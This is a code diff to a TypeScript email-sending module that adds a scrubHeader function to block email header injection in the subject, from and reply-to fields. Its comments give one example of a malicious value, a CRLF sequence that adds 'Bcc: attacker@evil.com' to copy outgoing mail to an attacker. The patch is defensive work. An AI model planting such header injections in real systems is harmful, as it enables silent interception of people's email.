@@ -20,6 +20,21 @@ import {
 } from "./from";
 import { logger } from "@/lib/logger";
 
+/**
+ * M8 - strip CR/LF/NUL from any value that will be sent as an email
+ * header (Subject, From, Reply-To, To, X-* tags). RFC 5322 headers
+ * are line-terminated by CRLF; allowing CR/LF/NUL through lets a
+ * malicious template variable inject `\r\nBcc: attacker@evil.com`
+ * and exfiltrate every outgoing message. Trim trailing whitespace
+ * to keep subject lines tidy.
+ *
+ * Exported for unit tests; the call sites below are the only
+ * production callers.
+ */
+export function scrubHeader(value: string): string {
+  return value.replace(/[\r\n\0]/g, " ").trim();
+}
+
 export interface SendEmailInput {
   to: string | string[];
   subject: string;
@@ -103,11 +118,22 @@ export async function sendEmail(input: SendEmailInput): Promise<SendEmailResult>
     ...(devRedirect ? [{ name: "dev_redirect", value: "true" }] : []),
   ];
 
+  // M8 fix - email header injection. CR/LF/NUL in a `Subject:` line
+  // lets a hostile interpolator add `Bcc:`, `Reply-To:` or even a
+  // second message header set, which would silently exfiltrate
+  // outgoing mail. Resend's API normally guards against this but we
+  // belt-and-brace at the boundary so a future provider swap (or a
+  // direct SMTP fallback) inherits the protection. The same scrub
+  // is applied to `from` / `replyTo` for the same reason.
+  const safeSubject = scrubHeader(input.subject);
+  const safeFrom = scrubHeader(from);
+  const safeReplyTo = scrubHeader(replyTo);
+
   const payload: Record<string, unknown> = {
-    from,
+    from: safeFrom,
     to,
-    subject: input.subject,
-    replyTo,
+    subject: safeSubject,
+    replyTo: safeReplyTo,
   };
   if (html) payload.html = html;
   if (text) payload.text = text;
